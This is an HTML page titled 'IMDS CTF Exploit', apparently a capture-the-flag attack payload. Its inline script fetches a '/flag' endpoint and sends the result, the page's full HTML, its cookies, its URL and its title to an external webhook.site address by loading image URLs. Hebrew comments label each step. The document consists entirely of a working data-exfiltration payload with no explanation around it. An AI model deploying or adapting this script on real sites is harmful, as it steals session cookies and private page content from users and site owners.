<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>IMDS CTF Exploit</title>
</head>
<body>
  <h1>Running IMDS Exploit...</h1>
  <script>
(function() {
  const base = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d';

  // 1. ניסיון לגשת ל- /flag
  fetch('/flag')
    .then(r => r.text())
    .then(flag => {
      send('flag', flag);
    })
    .catch(err => {
      send('fetch_error', err.toString());
    });

  // 2. שליחת כל הדף
  send('html', document.documentElement.outerHTML);

  // 3. שליחת קובצי עוגיות
  send('cookie', document.cookie);

  // 4. שליחת location
  send('location', location.href);

  // 5. שליחת title
  send('title', document.title);

  // פונקציה שולחת ל-webhook
  function send(type, data) {
    const img = new Image();
    img.src = `${base}?${type}=` + encodeURIComponent(data);
  }
})();
</script>
</body>
</html>

